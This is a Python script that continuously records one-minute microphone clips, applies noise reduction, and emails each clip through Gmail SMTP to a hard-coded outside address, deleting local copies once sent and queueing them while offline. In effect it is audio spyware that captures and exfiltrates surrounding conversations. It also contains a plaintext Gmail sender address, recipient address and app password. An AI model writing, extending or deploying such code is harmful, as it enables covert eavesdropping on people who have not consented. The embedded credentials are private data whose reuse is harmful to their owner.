import smtplib
import os
import time
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.mime.application import MIMEApplication
import sounddevice as sd
import numpy as np
import wave
from datetime import datetime
import socket
import threading
import logging
import noisereduce as nr

# Configure logging
logging.basicConfig(level=logging.INFO,
                    format='%(asctime)s - %(levelname)s - %(message)s')

# Configuration
CONFIG = {
    "email": {
        "sender": "tanyinsobright237@gmail.com",
        "recipient": "wasiemmanuela183@gmail.com",
        "password": "kpoq vsww dbnt fzfn",  # Use app password or correct password
        "smtp_server": "smtp.gmail.com",
        "smtp_port": 587
    },
    "audio": {
        "recording_interval": 60,  # seconds (1 minute)
        "sample_rate": 44100,      # Hz
        "channels": 1,             # Mono
        "max_offline_storage": 50  # max files to store when offline
    },
    "paths": {
        "audio_recordings": "audio_recordings"
    }
}

# Create directory if it doesn't exist
os.makedirs(CONFIG["paths"]["audio_recordings"], exist_ok=True)

# Global flag for internet connectivity
is_online = False
stop_flag = False

def check_internet():
    """Check internet connectivity with timeout"""
    try:
        socket.create_connection(("8.8.8.8", 53), timeout=5)
        return True
    except OSError:
        return False

def send_email(subject, body, attachments=None):
    """Send email with audio attachments"""
    if attachments is None:
        attachments = []
    
    try:
        message = MIMEMultipart()
        message['Subject'] = subject
        message['From'] = CONFIG["email"]["sender"]
        message['To'] = CONFIG["email"]["recipient"]
        message.attach(MIMEText(body))

        for file_path in attachments:
            if not os.path.exists(file_path):
                continue
                
            with open(file_path, "rb") as f:
                part = MIMEApplication(f.read(), Name=os.path.basename(file_path))
                part['Content-Disposition'] = f'attachment; filename="{os.path.basename(file_path)}"'
                message.attach(part)

        with smtplib.SMTP(CONFIG["email"]["smtp_server"], CONFIG["email"]["smtp_port"]) as smtp:
            smtp.starttls()
            smtp.login(CONFIG["email"]["sender"], CONFIG["email"]["password"])
            smtp.sendmail(CONFIG["email"]["sender"], CONFIG["email"]["recipient"], message.as_string())
        logging.info(f"Email sent with {len(attachments)} attachment(s).")
        return True
    except Exception as e:
        logging.error(f"Email error: {e}")
        return False

def send_pending_recordings():
    """Send all pending audio recordings when coming online"""
    global is_online
    
    if not is_online:
        return
        
    pending_files = []
    try:
        for file in os.listdir(CONFIG["paths"]["audio_recordings"]):
            file_path = os.path.join(CONFIG["paths"]["audio_recordings"], file)
            if os.path.isfile(file_path) and file.endswith('.wav'):
                pending_files.append(file_path)
        
        if pending_files:
            batch_size = 2  # Smaller batch size for audio files
            for i in range(0, len(pending_files), batch_size):
                batch = pending_files[i:i + batch_size]
                if send_email("Pending Audio Recordings", "Attached are the audio recordings from offline period.", batch):
                    for file_path in batch:
                        try:
                            os.remove(file_path)
                            logging.info(f"Deleted sent file: {file_path}")
                        except Exception as e:
                            logging.error(f"Error deleting file {file_path}: {e}")
    except Exception as e:
        logging.error(f"Error in send_pending_recordings: {e}")

def record_audio():
    """Record audio, apply noise reduction, and save to file"""
    try:
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        filename = os.path.join(CONFIG["paths"]["audio_recordings"], f"recording_{timestamp}.wav")
        
        logging.info(f"Starting {CONFIG['audio']['recording_interval']} second recording...")
        audio_data = sd.rec(
            int(CONFIG["audio"]["sample_rate"] * CONFIG["audio"]["recording_interval"]),
            samplerate=CONFIG["audio"]["sample_rate"],
            channels=CONFIG["audio"]["channels"],
            dtype='int16'
        )
        sd.wait()  # Wait until recording is finished
        
        # Convert to float32 for noise reduction processing
        audio_float = audio_data.astype(np.float32).flatten()
        
        # Apply noise reduction
        reduced_noise = nr.reduce_noise(y=audio_float, sr=CONFIG["audio"]["sample_rate"])
        
        # Convert back to int16
        reduced_noise_int16 = np.int16(reduced_noise)
        
        # Reshape to original shape (channels)
        reduced_noise_int16 = reduced_noise_int16.reshape(audio_data.shape)
        
        with wave.open(filename, 'wb') as wf:
            wf.setnchannels(CONFIG["audio"]["channels"])
            wf.setsampwidth(2)  # 2 bytes for int16
            wf.setframerate(CONFIG["audio"]["sample_rate"])
            wf.writeframes(reduced_noise_int16.tobytes())
            
        logging.info(f"Audio saved with noise reduction: {filename}")
        return filename
    except Exception as e:
        logging.error(f"Audio recording error: {e}")
        return None

def cleanup_old_recordings():
    """Clean up old recordings if storage limit reached"""
    try:
        files = sorted(
            [os.path.join(CONFIG["paths"]["audio_recordings"], f) 
             for f in os.listdir(CONFIG["paths"]["audio_recordings"]) if f.endswith('.wav')],
            key=os.path.getmtime
        )
        
        while len(files) > CONFIG["audio"]["max_offline_storage"]:
            try:
                os.remove(files[0])
                logging.info(f"Deleted old recording: {files[0]}")
                files.pop(0)
            except Exception as e:
                logging.error(f"Error deleting old recording: {e}")
                break
    except Exception as e:
        logging.error(f"Error in cleanup_old_recordings: {e}")

def monitoring_loop():
    """Main monitoring loop"""
    global is_online, stop_flag
    
    while not stop_flag:
        try:
            # Check internet status
            current_status = check_internet()
            if current_status != is_online:
                is_online = current_status
                logging.info(f"Internet status changed: {'Online' if is_online else 'Offline'}")
                
                if is_online:
                    send_pending_recordings()
            
            # Record audio
            recording_file = record_audio()
            
            # Send immediately if online
            if is_online and recording_file:
                if send_email("Audio Recording Update", "Attached is the latest audio recording.", [recording_file]):
                    try:
                        os.remove(recording_file)
                        logging.info(f"Deleted sent recording: {recording_file}")
                    except Exception as e:
                        logging.error(f"Error removing sent recording: {e}")
            
            # Clean up if offline storage is full
            if not is_online:
                cleanup_old_recordings()
                
        except Exception as e:
            logging.error(f"Error in monitoring loop: {e}")
            time.sleep(5)  # Wait before retrying

def main():
    global stop_flag
    
    try:
        # Start monitoring thread
        monitoring_thread = threading.Thread(target=monitoring_loop)
        monitoring_thread.daemon = False
        monitoring_thread.start()
        
        logging.info("Audio monitoring started. Press Ctrl+C to stop...")
        
        # Keep main thread alive
        while monitoring_thread.is_alive():
            time.sleep(1)
            
    except KeyboardInterrupt:
        logging.info("\nStopping audio monitoring...")
        stop_flag = True
        monitoring_thread.join(timeout=5)
    except Exception as e:
        logging.error(f"Fatal error: {e}")
        stop_flag = True

if __name__ == "__main__":
    main()